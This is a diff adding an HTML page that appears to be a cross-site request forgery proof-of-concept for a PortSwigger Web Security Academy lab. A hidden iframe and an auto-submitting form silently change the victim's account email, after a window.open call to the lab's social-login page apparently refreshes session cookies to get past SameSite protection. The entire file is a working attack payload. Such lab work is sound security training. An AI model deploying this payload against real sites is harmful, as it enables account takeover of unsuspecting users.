@@ -1,0 +1,18 @@
+<html>
+    <body>
+        <iframe name="csrf-iframe" style="display: none;"></iframe>
+
+        <form id="csrf-form" action="https://0ad900af0329cf7383e528d900d90013.web-security-academy.net/my-account/change-email">
+            <input name="email" value="test8@tester.ca"
+        </form>
+
+        <script>
+            window.open('https://0ad900af0329cf7383e528d900d90013.web-security-academy.net/social-login'); // this request will open in new broswer 
+            // broweser popup might block it as well 
+
+            setTimeout(() => {
+                document.getElementById('csrf-form').submit();
+            }, 3000);
+        </script>
+    </body>
+</html>
